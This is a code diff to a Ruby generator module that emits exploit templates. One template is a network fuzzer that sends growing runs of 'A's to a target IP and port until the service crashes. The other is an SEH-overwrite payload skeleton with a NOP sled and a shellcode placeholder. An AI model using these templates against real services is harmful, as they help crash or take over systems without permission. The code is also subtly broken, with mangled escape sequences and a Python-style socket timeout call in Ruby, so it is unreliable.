@@ -4,11 +4,11 @@ module Generate
   class Content
     protected
       def self.get_remote_content
-        "# Basic buffer overflow Example\nrequire 'socket'\n\n# Get Argument Target IP and Port\ntarget = ARGF.argv[0]\nport = ARGF.argv[1]\n\n# Compact IP/Port\nsocket_addr = Socket.pack_sockaddr_in(port, target)\n\n# Simple buffer of A's\nbuff = 'x41'*50\n\nwhile true\n\tbegin\n\t\t# Create new socket to connect C style\n\t\ts = Socket.new(:INET, :STREAM, 0)\n\t\ts.settimeout(2)\n\n\t\t#connect\n\t\ts.connect(socket_addr)\n\t\ts.recv(1024)\n\t\tputs "+'"Sending buffer with length #{buff.length.to_s}"'+"\n\t\ts.send("+'"User #{buff}rn", 0'+")\n\t\ts.close()\n\t\tsleep(1)\n\n\t\tbuff = buff + 'x41'*50\n\trescue\n\t\tputs "+'"[+] Crash occured with buffer length #{(buff.length - 50).to_s}"'+"\n\t\texit\n\tend\nend"
+        "#!/usr/bin/ruby\n\n# Basic buffer overflow Example\nrequire 'socket'\n\n# Get Argument Target IP and Port\ntarget = ARGF.argv[0]\nport = ARGF.argv[1]\n\n# Compact IP/Port\nsocket_addr = Socket.pack_sockaddr_in(port, target)\n\n# Simple buffer of A's\nbuff = 'x41'*50\n\nwhile true\n\tbegin\n\t\t# Create new socket to connect C style\n\t\ts = Socket.new(:INET, :STREAM, 0)\n\t\ts.settimeout(2)\n\n\t\t#connect\n\t\ts.connect(socket_addr)\n\t\ts.recv(1024)\n\t\tputs "+'"Sending buffer with length #{buff.length.to_s}"'+"\n\t\ts.send("+'"User #{buff}rn", 0'+")\n\t\ts.close()\n\t\tsleep(1)\n\n\t\tbuff = buff + 'x41'*50\n\trescue\n\t\tputs "+'"[+] Crash occured with buffer length #{(buff.length - 50).to_s}"'+"\n\t\texit\n\tend\nend"
       end
 
       def self.get_payload_content
-        "This is a test!!"
+        "#!/usr/bin/ruby\n\n # Basic Payload Example\nfilename = 'ENTER INFO'\n\nshellcode= ( )\n\nOFFSET = # Enter NUM\nBYTES =  # Enter NUM\n\nnops =" + '"\x90"' + "*20 + shellcode\n\n# Designed to deal with SEH (POP,POP,RET)\nbuffer ="+'"A"' + "* OFFSET + " + '"SEH" ' + "+ " + '"nSEH" ' + "+ nops + " + '"B" '+ "* (BYTES - nops.length)\n\nFile.open(filename, 'w+') { |f| f.write(buffer) }"
       end
   end
 
